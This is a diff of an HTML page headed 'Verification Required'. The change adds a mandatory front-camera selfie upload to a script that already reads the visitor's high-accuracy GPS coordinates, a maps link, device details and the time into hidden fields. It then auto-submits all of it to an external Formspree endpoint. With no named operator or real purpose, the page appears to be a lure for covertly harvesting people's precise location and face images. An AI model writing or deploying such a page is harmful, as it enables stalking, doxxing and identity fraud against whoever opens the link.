@@ -1,24 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Location Verification</title>
+  <title>Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
+
 <body style="font-family:Arial;text-align:center;padding:40px;">
 
-<h2>Location Verification</h2>
-<p>This page will capture your exact location for verification.</p>
+<h2>Verification Required</h2>
+<p>This page will capture your location and a selfie for verification.</p>
 
-<button onclick="getLocation()" style="padding:12px 20px;font-size:16px;">
-Allow & Continue
-</button>
+<form
+  action="https://formspree.io/f/mdanrqqb"
+  method="POST"
+  enctype="multipart/form-data"
+  id="form">
 
-<form id="form" action="https://formspree.io/f/XXXXYYYY" method="POST">
   <input type="hidden" name="latitude" id="lat">
   <input type="hidden" name="longitude" id="lon">
   <input type="hidden" name="maps" id="maps">
   <input type="hidden" name="device" id="device">
   <input type="hidden" name="time" id="time">
+
+  <p><b>Take Selfie</b></p>
+  <input type="file" name="selfie" accept="image/*" capture="user" required>
+
+  <br><br>
+
+  <button type="button"
+    onclick="getLocation()"
+    style="padding:12px 20px;font-size:16px;">
+    Allow & Continue
+  </button>
 </form>
 
 <script>
@@ -35,11 +48,12 @@ function getLocation() {
     document.getElementById("time").value = new Date().toString();
 
     document.getElementById("form").submit();
-  }, () => alert("Location permission denied"), {
-    enableHighAccuracy: true
-  });
+  },
+  () => alert("Location permission denied"),
+  { enableHighAccuracy: true });
 }
 </script>
 
 </body>
 </html>
+
